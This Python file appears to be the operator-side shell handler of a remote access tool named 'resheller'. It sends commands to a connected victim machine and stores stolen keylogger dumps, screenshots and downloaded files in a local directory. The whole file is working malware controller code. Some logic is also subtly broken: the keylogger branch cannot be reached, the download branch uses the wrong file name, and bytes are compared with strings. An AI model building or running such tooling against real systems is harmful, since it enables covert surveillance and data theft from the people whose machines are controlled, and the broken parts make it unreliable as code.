#!/usr/bin/env python3
from base64 import b64decode
from os import path
from pathlib import Path
from time import strftime

from src.server.pipe import SafeSocket
from src.shell.ps1 import Ps1
from src.stdout.color import Color


class Shell:

    def __init__(self, ips, targets, sessions):
        self.ips = ips
        self.targets = targets
        self.ip, _ = ips[sessions]
        self.target = targets[sessions]
        self.time = strftime("%H.%M.%S")
        self.safe_sock = SafeSocket(self.target)
        self.ps1 = Ps1(self.safe_sock)
        self.log = None

    @staticmethod
    def make_dir(cmd):
        home = str(Path.home())
        date = strftime("%Y.%m.%d")
        main_dir = path.join(home, ".resheller")
        _dir = path.join(main_dir, date, cmd)
        if not path.isdir(_dir):
            Path(_dir).mkdir(parents=True, exist_ok=True)
        return _dir

    def keylogger(self, cmd):
        if cmd == "dump":
            _dir = self.make_dir("logs")
            logs = path.join(_dir, f"keylog_{self.time}.txt")
            self.log = self.safe_sock.recv()
            if self.log[:3] == "[!]":
                print(Color(self.log).b_red())
            else:
                with open(logs, 'w') as log_file:
                    log_file.write(self.log)
                print(Color(f"Saved {logs}\n").grn())
        elif cmd == "print":
            print(self.log)

    def download_file(self, cmd):
        count = 1
        _dir = self.make_dir("downloads")
        download = path.join(_dir, cmd)
        payload = self.safe_sock.recv()
        if path.isfile(download):
            while True:
                if path.isfile(f"{download}.{count}"):
                    count += 1
                else:
                    download = f"{download}.{count}"
                    break
        with open(download, 'wb') as file:
            file.write(b64decode(payload))
        print(Color(f'Saved {download}\n').grn())

    def screenshot(self):
        _dir = self.make_dir("screenshots")
        image = path.join(_dir, f"screenshot_{self.time}.png")
        payload = self.safe_sock.recv()
        payload = b64decode(payload)
        if payload[:3] == "[!]":
            print(Color(payload).b_red())
        else:
            with open(image, "wb") as screenshot:
                screenshot.write(payload)
                screenshot.close()
            print(Color(f"Saved {image}\n").grn())

    def print_stdout(self):
        stdout = self.safe_sock.recv()
        if stdout[:3] == "[+]":
            if len(stdout) > 3:
                stdout = Color(f"{stdout}\n").b_grn()
            else:
                return
        elif stdout[:3] == "[!]":
            stdout = Color(f"{stdout}\n").b_red()
        elif stdout[:3] == "[*]":
            stdout = Color(f"{stdout}\n").ylw()
        print(stdout)
        return

    def exit_shell(self):
        self.target.close()
        self.targets.remove(self.target)
        self.ips.remove(self.ip)

    def shell(self):
        while True:
            cmd = self.ps1.prompt()
            self.safe_sock.send(cmd)
            if cmd == "screenshot":
                self.screenshot()
            elif cmd == "keylogger" and len(cmd) > 9:
                self.keylogger(cmd[:9])
            elif cmd[:8] == "download":
                self.download_file(cmd[:9])
            elif cmd == 'quit' or cmd == "exit":
                if cmd == "exit":
                    self.exit_shell()
                break
            else:
                self.print_stdout()
